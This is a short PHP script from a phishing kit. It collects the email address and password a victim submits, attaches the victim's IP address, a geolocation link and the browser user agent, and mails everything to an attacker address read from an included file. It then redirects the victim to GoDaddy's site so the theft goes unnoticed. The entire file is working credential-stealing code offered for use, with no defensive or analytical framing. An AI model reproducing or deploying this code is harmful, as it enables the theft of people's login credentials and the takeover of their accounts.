<?php
if($_POST["email"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------@INBOX THE GREATEST-----------------------\n";
$message .= "Email             : ".$_POST['email']."\n";
$message .= "Password           : ".$_POST['pd']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- @INBOX THE GREATEST --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://www.godaddy.com");
}else{
header ("Location: index.php");
}

?>